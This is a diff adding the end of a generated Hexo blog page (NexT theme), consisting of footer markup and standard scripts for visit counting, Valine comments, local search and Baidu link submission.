class="nav-text">level18</span></a></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright"> 
+&copy; 2020 &mdash; <span itemprop="copyrightYear">2026</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Ranuy</span>
+
+  
+</div>
+
+
+<!--
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Mist</a> v5.1.4</div>
+-->
+
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+  
+    <span class="site-uv">
+      本站访问数<i class="fa fa-user"></i>
+      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
+      人次
+    </span>
+  
+
+  
+    <span class="site-pv">
+      本站总访问量<i class="fa fa-eye"></i>
+      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
+      次
+    </span>
+  
+</div>
+
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+  <script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+  <script src="//unpkg.com/valine/dist/Valine.min.js"></script>
+  
+  <script type="text/javascript">
+    var GUEST = ['nick','mail','link'];
+    var guest = 'nick,mail,link';
+    guest = guest.split(',').filter(item=>{
+      return GUEST.indexOf(item)>-1;
+    });
+    new Valine({
+        el: '#comments' ,
+        verify: false,
+        notify: false,
+        appId: 'Lbc1dgArUjhEyb6SHkHAMT4u-gzGzoHsz',
+        appKey: 'v5q6ybk4A0ffzzrJuW1FvauY',
+        placeholder: 'Just go go',
+        avatar:'mm',
+        guest_info:guest,
+        pageSize:'10' || 10,
+    });
+  </script>
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+  <script src="https://cdn1.lncld.net/static/js/av-core-mini-0.6.4.js"></script>
+  <script>AV.initialize("", "");</script>
+  <script>
+    function showTime(Counter) {
+      var query = new AV.Query(Counter);
+      var entries = [];
+      var $visitors = $(".leancloud_visitors");
+
+      $visitors.each(function () {
+        entries.push( $(this).attr("id").trim() );
+      });
+
+      query.containedIn('url', entries);
+      query.find()
+        .done(function (results) {
+          var COUNT_CONTAINER_REF = '.leancloud-visitors-count';
+
+          if (results.length === 0) {
+            $visitors.find(COUNT_CONTAINER_REF).text(0);
+            return;
+          }
+
+          for (var i = 0; i < results.length; i++) {
+            var item = results[i];
+            var url = item.get('url');
+            var time = item.get('time');
+            var element = document.getElementById(url);
+
+            $(element).find(COUNT_CONTAINER_REF).text(time);
+          }
+          for(var i = 0; i < entries.length; i++) {
+            var url = entries[i];
+            var element = document.getElementById(url);
+            var countSpan = $(element).find(COUNT_CONTAINER_REF);
+            if( countSpan.text() == '') {
+              countSpan.text(0);
+            }
+          }
+        })
+        .fail(function (object, error) {
+          console.log("Error: " + error.code + " " + error.message);
+        });
+    }
+
+    function addCount(Counter) {
+      var $visitors = $(".leancloud_visitors");
+      var url = $visitors.attr('id').trim();
+      var title = $visitors.attr('data-flag-title').trim();
+      var query = new AV.Query(Counter);
+
+      query.equalTo("url", url);
+      query.find({
+        success: function(results) {
+          if (results.length > 0) {
+            var counter = results[0];
+            counter.fetchWhenSave(true);
+            counter.increment("time");
+            counter.save(null, {
+              success: function(counter) {
+                var $element = $(document.getElementById(url));
+                $element.find('.leancloud-visitors-count').text(counter.get('time'));
+              },
+              error: function(counter, error) {
+                console.log('Failed to save Visitor num, with error message: ' + error.message);
+              }
+            });
+          } else {
+            var newcounter = new Counter();
+            /* Set ACL */
+            var acl = new AV.ACL();
+            acl.setPublicReadAccess(true);
+            acl.setPublicWriteAccess(true);
+            newcounter.setACL(acl);
+            /* End Set ACL */
+            newcounter.set("title", title);
+            newcounter.set("url", url);
+            newcounter.set("time", 1);
+            newcounter.save(null, {
+              success: function(newcounter) {
+                var $element = $(document.getElementById(url));
+                $element.find('.leancloud-visitors-count').text(newcounter.get('time'));
+              },
+              error: function(newcounter, error) {
+                console.log('Failed to create');
+              }
+            });
+          }
+        },
+        error: function(error) {
+          console.log('Error:' + error.code + " " + error.message);
+        }
+      });
+    }
+
+    $(function() {
+      var Counter = AV.Object.extend("Counter");
+      if ($('.leancloud_visitors').length == 1) {
+        addCount(Counter);
+      } else if ($('.post-title-link').length > 1) {
+        showTime(Counter);
+      }
+    });
+  </script>
+
+
+
+  
+
+  
+<script>
+(function(){
+    var bp = document.createElement('script');
+    var curProtocol = window.location.protocol.split(':')[0];
+    if (curProtocol === 'https') {
+        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';        
+    }
+    else {
+        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+    }
+    var s = document.getElementsByTagName("script")[0];
+    s.parentNode.insertBefore(bp, s);
+})();
+</script>
+
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
